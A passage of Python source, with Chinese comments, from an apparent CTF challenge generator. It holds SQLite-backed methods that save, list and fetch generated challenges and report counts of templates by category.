            cursor.execute('''
                INSERT INTO generated_challenges
                (challenge_id, category, name, description, difficulty, points, 
                 flag, flag_format, hints, solution, files, solved)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                challenge_id,
                category,
                challenge_data.get('name', ''),
                challenge_data.get('description', ''),
                challenge_data.get('difficulty', 'medium'),
                challenge_data.get('points', 100),
                challenge_data.get('flag', ''),
                challenge_data.get('flag_format', 'flag{.*}'),
                json.dumps(challenge_data.get('hints', [])),
                challenge_data.get('solution', ''),
                json.dumps(challenge_data.get('files', {})),
                False
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"保存挑戰錯誤: {e}")
    
    def get_challenge_list(self, category: str = None) -> Dict[str, Any]:
        """獲取挑戰列表"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            if category:
                cursor.execute('''
                    SELECT challenge_id, category, name, difficulty, points, solved
                    FROM generated_challenges
                    WHERE category = ?
                    ORDER BY points ASC
                ''', (category,))
            else:
                cursor.execute('''
                    SELECT challenge_id, category, name, difficulty, points, solved
                    FROM generated_challenges
                    ORDER BY points ASC
                ''')
            
            challenges = []
            for row in cursor.fetchall():
                challenges.append({
                    'challenge_id': row[0],
                    'category': row[1],
                    'name': row[2],
                    'difficulty': row[3],
                    'points': row[4],
                    'solved': bool(row[5])
                })
            
            conn.close()
            
            return {
                'success': True,
                'challenges': challenges,
                'total_count': len(challenges)
            }
            
        except Exception as e:
            logger.error(f"獲取挑戰列表錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_challenge_details(self, challenge_id: str) -> Dict[str, Any]:
        """獲取挑戰詳情"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT challenge_id, category, name, description, difficulty, points,
                       flag, flag_format, hints, solution, files
                FROM generated_challenges
                WHERE challenge_id = ?
            ''', (challenge_id,))
            
            row = cursor.fetchone()
            conn.close()
            
            if row:
                return {
                    'success': True,
                    'challenge': {
                        'challenge_id': row[0],
                        'category': row[1],
                        'name': row[2],
                        'description': row[3],
                        'difficulty': row[4],
                        'points': row[5],
                        'flag': row[6],
                        'flag_format': row[7],
                        'hints': json.loads(row[8]) if row[8] else [],
                        'solution': row[9],
                        'files': json.loads(row[10]) if row[10] else {}
                    }
                }
            else:
                return {'success': False, 'error': '挑戰不存在'}
                
        except Exception as e:
            logger.error(f"獲取挑戰詳情錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_status(self) -> Dict[str, Any]:
        """獲取系統狀態"""
        try:
            return {
                'success': True,
                'challenge_templates': {
                    'web': len(self.challenge_templates['web']),
                    'pwn': len(self.challenge_templates['pwn']),
                    'crypto': len(self.challenge_templates['crypto']),
                    'forensics': len(self.challenge_templates['forensics']),
                    'reverse': len(self.challenge_templates['reverse'])
                },
                'generated_challenges': len(self.generated_challenges)
            }
        except Exception as e:
            logger.error(f"獲取系統狀態錯誤: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_comprehensive_report(self) -> Dict[str, Any]:
        """獲取綜合報告"""
        try:
            return {
                'success': True,
                'ctf_challenge_generator': {
                    'challenge_templates': {
                        'web': list(self.challenge_templates['web'].keys()),
                        'pwn': list(self.challenge_templates['pwn'].keys()),
                        'crypto': list(self.challenge_templates['crypto'].keys()),
                        'forensics': list(self.challenge_templates['forensics'].keys()),
                        'reverse': list(self.challenge_templates['reverse'].keys())
                    },
                    'generated_challenges': self.generated_challenges
                }
            }
        except Exception as e:
            logger.error(f"獲取綜合報告錯誤: {e}")
            return {'success': False, 'error': str(e)}
